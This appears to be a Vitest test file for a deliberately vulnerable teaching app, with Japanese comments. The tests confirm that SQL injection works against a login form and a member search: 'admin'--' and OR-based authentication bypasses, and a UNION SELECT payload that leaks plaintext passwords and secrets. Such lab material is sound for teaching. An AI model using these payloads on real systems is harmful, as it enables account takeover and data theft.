// ============================================================================
// SQLインジェクション モジュールのテスト
// ----------------------------------------------------------------------------
// 「脆弱であること」= 入力を SQL に連結しているため、認証バイパスと UNION による
// データ窃取が成立することを固定する。対策(プレースホルダ)を入れると落ちる想定。
// 実在事例: 2011年 Sony Pictures の SQLi 漏えい(平文パスワードを含む約100万件)。
// ============================================================================

import { describe, expect, it } from 'vitest';
import { app } from '../app';

const form = (data: Record<string, string>) => ({
  method: 'POST',
  headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams(data).toString(),
});

describe('SQLi - 認証まわり(正常系)', () => {
  it('正しい資格情報ならログインできる', async () => {
    const res = await app.request('/sns/login', form({ username: 'you', password: 'password123' }));
    const json = (await res.json()) as { ok: boolean; loggedInAs?: string };
    expect(res.status).toBe(200);
    expect(json.ok).toBe(true);
    expect(json.loggedInAs).toBe('you');
  });

  it('パスワードが違えば拒否される(=本物の認証として機能している)', async () => {
    const res = await app.request('/sns/login', form({ username: 'you', password: 'wrong' }));
    expect(res.status).toBe(401);
    const json = (await res.json()) as { ok: boolean };
    expect(json.ok).toBe(false);
  });
});

describe('SQLi - 認証バイパス(脆弱性)', () => {
  it("username に admin'-- を入れるとパスワード無しで admin に成りすませる", async () => {
    const res = await app.request('/sns/login', form({ username: "admin'--", password: 'nope' }));
    const json = (await res.json()) as { ok: boolean; loggedInAs?: string };
    expect(res.status).toBe(200);
    expect(json.ok).toBe(true);
    expect(json.loggedInAs).toBe('admin');
  });

  it("' OR '1'='1' -- で誰かとしてログインできてしまう", async () => {
    const res = await app.request(
      '/sns/login',
      form({ username: "' OR '1'='1' --", password: 'whatever' }),
    );
    const json = (await res.json()) as { ok: boolean; loggedInAs?: string };
    expect(res.status).toBe(200);
    expect(json.ok).toBe(true);
    expect(json.loggedInAs).toBeTruthy();
  });
});

describe('SQLi - UNION によるデータ窃取(脆弱性)', () => {
  it('会員検索に UNION を注入すると平文パスワードと秘密メモが漏れる', async () => {
    const payload = "' UNION SELECT id, username || ':' || password, email, secret FROM members --";
    const res = await app.request(`/sns/members?name=${encodeURIComponent(payload)}`);
    expect(res.status).toBe(200);
    const text = await res.text();
    // 本来この検索では見えないはずの平文パスワード・秘密が漏れている。
    expect(text).toContain('password123');
    expect(text).toContain('S0ny-pwn3d!');
    expect(text).toContain('管理者用バックアップ鍵');
  });

  it('通常の検索(注入なし)は該当ユーザーの公開情報のみ返す', async () => {
    const res = await app.request('/sns/members?name=you');
    const json = (await res.json()) as { ok: boolean; rows: Array<{ username: string }> };
    expect(json.ok).toBe(true);
    expect(json.rows).toHaveLength(1);
    expect(json.rows[0].username).toBe('you');
  });
});
